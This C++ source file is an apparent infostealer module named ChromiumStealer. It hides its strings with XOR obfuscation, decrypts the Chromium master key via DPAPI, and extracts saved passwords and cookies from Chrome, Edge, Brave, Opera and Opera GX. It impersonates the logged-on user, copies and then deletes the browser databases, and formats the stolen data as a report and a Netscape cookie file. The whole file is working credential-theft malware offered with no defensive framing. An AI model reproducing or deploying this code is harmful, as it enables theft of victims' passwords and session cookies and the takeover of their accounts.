#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <wincrypt.h>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#pragma comment(lib, "crypt32.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
        const wchar_t kOsCryptEnc[] = { 'o'^0x4B, 's'^0x1F, '_'^0x8C, 'c'^0x3E, 'r'^0x4B, 'y'^0x1F, 'p'^0x8C, 't'^0x3E }; // os_crypt
        const wchar_t kEncryptedKeyEnc[] = { 'e'^0x4B, 'n'^0x1F, 'c'^0x8C, 'r'^0x3E, 'y'^0x4B, 'p'^0x1F, 't'^0x8C, 'e'^0x3E, 'd'^0x4B, '_'^0x1F, 'k'^0x8C, 'e'^0x3E, 'y'^0x4B }; // encrypted_key
        const wchar_t kLocalStateEnc[] = { 'L'^0x4B, 'o'^0x1F, 'c'^0x8C, 'a'^0x3E, 'l'^0x4B, ' '^0x1F, 'S'^0x8C, 't'^0x3E, 'a'^0x4B, 't'^0x1F, 'e'^0x8C }; // Local State
        const wchar_t kLoginDataEnc[] = { 'L'^0x4B, 'o'^0x1F, 'g'^0x8C, 'i'^0x3E, 'n'^0x4B, ' '^0x1F, 'D'^0x8C, 'a'^0x3E, 't'^0x4B, 'a'^0x1F }; // Login Data
        const wchar_t kCookiesEnc[] = { 'C'^0x4B, 'o'^0x1F, 'o'^0x8C, 'k'^0x3E, 'i'^0x4B, 'e'^0x1F, 's'^0x8C }; // Cookies
        const wchar_t kQueryLoginsEnc[] = { 'S'^0x4B, 'E'^0x1F, 'L'^0x8C, 'E'^0x3E, 'C'^0x4B, 'T'^0x1F, ' '^0x8C, 'o'^0x3E, 'r'^0x4B, 'i'^0x1F, 'g'^0x8C, 'i'^0x3E, 'n'^0x4B, '_'^0x1F, 'u'^0x8C, 'r'^0x3E, 'l'^0x4B, ','^0x1F, ' '^0x8C, 'u'^0x3E, 's'^0x4B, 'e'^0x1F, 'r'^0x8C, 'n'^0x3E, 'a'^0x4B, 'm'^0x1F, 'e'^0x8C, '_'^0x3E, 'v'^0x4B, 'a'^0x1F, 'l'^0x8C, 'u'^0x3E, 'e'^0x4B, ','^0x1F, ' '^0x8C, 'p'^0x3E, 'a'^0x4B, 's'^0x1F, 's'^0x8C, 'w'^0x3E, 'o'^0x4B, 'r'^0x1F, 'd'^0x8C, '_'^0x3E, 'v'^0x4B, 'a'^0x1F, 'l'^0x8C, 'u'^0x3E, 'e'^0x4B, ' '^0x1F, 'F'^0x8C, 'R'^0x3E, 'O'^0x4B, 'M'^0x1F, ' '^0x8C, 'l'^0x3E, 'o'^0x4B, 'g'^0x1F, 'i'^0x8C, 'n'^0x3E, 's'^0x4B }; // SELECT origin_url, username_value, password_value FROM logins
        const wchar_t kQueryCookiesEnc[] = { 'S'^0x4B, 'E'^0x1F, 'L'^0x8C, 'E'^0x3E, 'C'^0x4B, 'T'^0x1F, ' '^0x8C, 'h'^0x3E, 'o'^0x4B, 's'^0x1F, 't'^0x8C, '_'^0x3E, 'k'^0x4B, 'e'^0x1F, 'y'^0x8C, ','^0x3E, ' '^0x4B, 'p'^0x1F, 'a'^0x8C, 't'^0x3E, 'h'^0x4B, ','^0x1F, ' '^0x8C, 'i'^0x3E, 's'^0x4B, '_'^0x1F, 's'^0x8C, 'e'^0x3E, 'c'^0x4B, 'u'^0x1F, 'r'^0x8C, 'e'^0x3E, ','^0x1F, ' '^0x8C, 'e'^0x3E, 'x'^0x4B, 'p'^0x1F, 'i'^0x8C, 'r'^0x3E, 'e'^0x4B, 's'^0x1F, '_'^0x8C, 'u'^0x3E, 't'^0x4B, 'c'^0x1F, ','^0x1F, ' '^0x8C, 'n'^0x3E, 'a'^0x4B, 'm'^0x1F, 'e'^0x8C, ','^0x3E, ' '^0x4B, 'e'^0x1F, 'n'^0x8C, 'c'^0x3E, 'r'^0x4B, 'y'^0x1F, 'p'^0x8C, 't'^0x3E, 'e'^0x4B, 'd'^0x1F, '_'^0x8C, 'v'^0x3E, 'a'^0x4B, 'l'^0x1F, 'u'^0x8C, 'e'^0x3E, ' '^0x4B, 'F'^0x1F, 'R'^0x8C, 'O'^0x3E, 'M'^0x4B, ' '^0x1F, 'c'^0x8C, 'o'^0x3E, 'o'^0x4B, 'k'^0x1F, 'i'^0x8C, 'e'^0x3E, 's'^0x4B }; // SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies

        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
            try {
                if (!fs::exists(localStatePath)) {
                    LOG_DEBUG("Local State file not found at " + localStatePath);
                    return {};
                }

                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string tempLocalState = std::string(tempPath) + "ls_" + std::to_string(GetTickCount64());
                if (!CopyFileA(localStatePath.c_str(), tempLocalState.c_str(), FALSE)) {
                    tempLocalState = localStatePath;
                }

                std::ifstream f(tempLocalState);
                if (!f.is_open()) {
                    LOG_DEBUG("Failed to open Local State file (even after copy)");
                    return {};
                }
                nlohmann::json j;
                f >> j;
                if (tempLocalState != localStatePath) DeleteFileA(tempLocalState.c_str());

                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, 8));
                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, 13));

                if (!j.contains(os_crypt) || !j[os_crypt].contains(encrypted_key_str)) {
                    LOG_DEBUG("Local State does not contain expected keys");
                    return {};
                }

                std::string encryptedKeyB64 = j[os_crypt][encrypted_key_str];
                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);

                if (encryptedKey.size() < 5) return {};
                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());

                DATA_BLOB in;
                in.pbData = dpapiEncryptedKey.data();
                in.cbData = (DWORD)dpapiEncryptedKey.size();
                DATA_BLOB out;

                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                    LocalFree(out.pbData);
                    LOG_DEBUG("Successfully decrypted master key from " + localStatePath);
                    return masterKey;
                } else {
                    LOG_DEBUG("CryptUnprotectData failed for master key. Error: " + std::to_string(GetLastError()));
                }
            } catch (const std::exception& e) {
                LOG_DEBUG("Exception in GetMasterKey: " + std::string(e.what()));
            } catch (...) {
                LOG_DEBUG("Unknown exception in GetMasterKey");
            }
            return {};
        }

        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
            if (ciphertext.empty()) return "";

            // Modern Chromium: v10/v11/v20 (AES-GCM)
            // v10/v11 starts with 'v1', v20 starts with 'v2'
            if (ciphertext.size() >= 15 && ciphertext[0] == 'v' && (ciphertext[1] == '1' || ciphertext[1] == '2')) {
                try {
                    if (ciphertext.size() < 3 + 12 + 16) {
                        LOG_DEBUG("Ciphertext too short for GCM");
                        return "";
                    }

                    std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                    // Payload is everything after prefix and IV. The last 16 bytes are the tag.
                    std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());

                    if (masterKey.empty()) {
                        LOG_DEBUG("Master key empty, cannot decrypt GCM");
                        return "";
                    }

                    crypto::AesGcm aes(masterKey);
                    std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
                    return std::string(decrypted.begin(), decrypted.end());
                } catch (const std::exception& e) {
                    LOG_DEBUG("AES-GCM Decryption failed: " + std::string(e.what()));
                    return "";
                } catch (...) {
                    LOG_DEBUG("AES-GCM Decryption failed (unknown exception)");
                    return "";
                }
            }

            // Legacy Chromium or others: DPAPI directly
            DATA_BLOB in;
            in.pbData = (BYTE*)ciphertext.data();
            in.cbData = (DWORD)ciphertext.size();
            DATA_BLOB out;

            if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                std::string decrypted((char*)out.pbData, out.cbData);
                LocalFree(out.pbData);
                return decrypted;
            }

            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            CopyFileA(src.c_str(), dest.c_str(), FALSE);
            // Also copy sidecars if they exist (WAL mode)
            std::string wal = src + "-wal";
            std::string shm = src + "-shm";
            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
        }

        void SafeDeleteDatabase(const std::string& path) {
            DeleteFileA(path.c_str());
            DeleteFileA((path + "-wal").c_str());
            DeleteFileA((path + "-shm").c_str());
        }
    }

    std::string DumpChromiumPasswords() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string report = "BROWSER_CREDENTIALS:\n";
        report += "BROWSER | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

        char path[MAX_PATH];
        char appDataPath[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            localAppData = path;
        }
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            roamingAppData = appDataPath;
        }
            
        struct BrowserPath {
            std::string name;
            std::string userDataPath;
            bool isRoaming;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x58\xE3\x59\x27\x73\xED\x62\x08\x77\xFE\x51\x26\x7A\xD0\x6B\x38\x7A\xFE\x1E\x0F\x7E\xF8\x5F\x17", 25)), false}, // \Google\Chrome\User Data
            {"Edge", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x1D\xE3\x53\x39\x70\xF3\x51\x2D\x74\xA0\x0B\x21\x74\xE1\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A\x17", 25)), false}, // \Microsoft\Edge\User Data
            {"Brave", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x0D\xF3\x20\x31\x72\x8F\x27\x3E\x29\x2D\x24\x2E\x16\x03\x3D\x22\x39\x2B\x22\x16\x1D\x3E\x2E\x34\x3C\x26\x31\x1D\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A", 38)), false}, // \BraveSoftware\Brave-Browser\User Data
            {"Opera", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x31", 22)), true}, // \Opera Software\Opera Stable
            {"Opera GX", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x00\x08\x17\x10\x3E\x3C\x21\x21\x31", 30)), true} // \Opera Software\Opera GX Stable
        };

        for (const auto& browser : browsers) {
            if (!fs::exists(browser.userDataPath)) continue;

            std::string localState = browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, 11));
            std::vector<BYTE> key = GetMasterKey(localState);

            try {
                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                    try {
                        const auto& entry = *it;
                        if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, 10))) {
                            std::string loginData = entry.path().string();
                            
                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());

                            SafeCopyDatabase(loginData, tempDb);

                            sqlite3* db;
                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, 57));
                                const char* query = query_str.c_str();
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                                        if (!url_ptr || !user_ptr) continue;

                                        std::string url = url_ptr;
                                        std::string username = user_ptr;
                                        const void* blob = sqlite3_column_blob(stmt, 2);
                                        int blobLen = sqlite3_column_bytes(stmt, 2);
                                        
                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string password = DecryptPassword(encryptedPass, key);

                                            if (!password.empty() && !username.empty()) {
                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                }
                                sqlite3_close(db);
                            } else {
                                if (db) {
                                    LOG_DEBUG("SQLite open failed: " + std::string(sqlite3_errmsg(db)));
                                    sqlite3_close(db);
                                }
                            }
                            SafeDeleteDatabase(tempDb);
                        }
                    } catch (...) {}

                    if (it.depth() > 3) it.disable_recursion_pending();
                }
            } catch (...) {}
        }

        if (impersonated) utils::RevertToSelf();
        return report;
    }

    std::string StealChromiumCookies() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::stringstream resultSS;
        resultSS << "# CHROMIUM COOKIE STEALER RESULTS\n";
        int cookieCount = 0;

        char path[MAX_PATH];
        char appDataPath[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            localAppData = path;
        }
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            roamingAppData = appDataPath;
        }

        struct BrowserPath {
            std::string name;
            std::string userDataPath;
            bool isRoaming;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x58\xE3\x59\x27\x73\xED\x62\x08\x77\xFE\x51\x26\x7A\xD0\x6B\x38\x7A\xFE\x1E\x0F\x7E\xF8\x5F", 24)), false},
            {"Edge", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x1D\xE3\x53\x39\x70\xF3\x51\x2D\x74\xA0\x0B\x21\x74\xE1\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A", 23)), false},
            {"Brave", localAppData + utils::ws2s(utils::DecryptW(L"\x17\x0D\xF3\x20\x31\x72\x8F\x27\x3E\x29\x2D\x24\x2E\x16\x03\x3D\x22\x39\x2B\x22\x16\x1D\x3E\x2E\x34\x3C\x26\x31\x1D\x1E\x3E\x3C\x31\x00\x05\x2D\x31\x2A", 38)), false},
            {"Opera", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x31", 22)), true},
            {"Opera GX", roamingAppData + utils::ws2s(utils::DecryptW(L"\x17\x00\x3C\x26\x31\x21\x00\x1C\x1D\x37\x3C\x31\x23\x30\x27\x00\x02\x31\x26\x21\x21\x00\x08\x17\x10\x3E\x3C\x21\x21\x31", 30)), true}
        };

        for (const auto& browser : browsers) {
            if (!fs::exists(browser.userDataPath)) continue;

            std::string localState = browser.userDataPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, 11));
            std::vector<BYTE> key = GetMasterKey(localState);

            try {
                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                    try {
                        const auto& entry = *it;
                        std::string filename = entry.path().filename().string();

                        if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, 7))) {
                            std::string cookiesPath = entry.path().string();

                            char tempPath[MAX_PATH];
                            GetTempPathA(MAX_PATH, tempPath);
                            std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());

                            SafeCopyDatabase(cookiesPath, tempDb);

                            sqlite3* db;
                            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                                std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, 86));
                                const char* query = query_str.c_str();
                                sqlite3_stmt* stmt;
                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                        const char* cpath = (const char*)sqlite3_column_text(stmt, 1);
                                        int isSecure = sqlite3_column_int(stmt, 2);
                                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                                        const char* name = (const char*)sqlite3_column_text(stmt, 4);

                                        const void* blob = sqlite3_column_blob(stmt, 5);
                                        int blobLen = sqlite3_column_bytes(stmt, 5);

                                        if (blobLen > 0) {
                                            std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
                                            std::string value = DecryptPassword(encryptedVal, key);

                                            if (!value.empty()) {
                                                // Chromium expiry is microseconds since 1601. Convert to unix for standard format?
                                                // Standard Netscape format uses seconds since 1970.
                                                long long unixExpiry = (expiry / 1000000) - 11644473600LL;
                                                if (unixExpiry < 0) unixExpiry = 0;

                                                resultSS << (host ? host : "") << "\t"
                                                         << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                                         << (cpath ? cpath : "") << "\t"
                                                         << (isSecure ? "TRUE" : "FALSE") << "\t"
                                                         << unixExpiry << "\t"
                                                         << (name ? name : "") << "\t"
                                                         << value << "\n";
                                                cookieCount++;
                                            }
                                        }
                                    }
                                    sqlite3_finalize(stmt);
                                } else {
                                    LOG_ERR("Failed to prepare cookie query for " + browser.name);
                                }
                                sqlite3_close(db);
                            }
                            SafeDeleteDatabase(tempDb);
                        }
                    } catch (...) {}

                    if (it.depth() > 3) it.disable_recursion_pending();
                }
            } catch (...) {}
        }

        std::stringstream finalOut;
        finalOut << "# Total Chromium cookies extracted: " << cookieCount << "\n";
        finalOut << resultSS.str();
        if (impersonated) utils::RevertToSelf();
        return finalOut.str();
    }

}
